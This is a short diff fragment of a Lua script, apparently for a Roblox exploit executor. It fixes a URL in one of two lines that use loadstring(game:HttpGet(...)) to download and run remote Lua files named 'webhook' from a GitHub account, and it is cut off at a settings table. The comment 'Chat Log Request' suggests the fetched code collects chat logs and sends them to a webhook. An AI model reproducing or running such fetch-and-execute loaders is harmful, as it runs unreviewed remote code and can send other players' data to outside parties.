@@ -2,7 +2,7 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Bluemanev2/webhookv1/main/webhook.lua"))()
 
 --// Chat Log Request 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Bluemanev2/webhookv2/main/webhookv2."))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bluemanev2/webhookv2/main/webhookv2"))()
 
 --// Global Variables 
 getgenv().settings = {
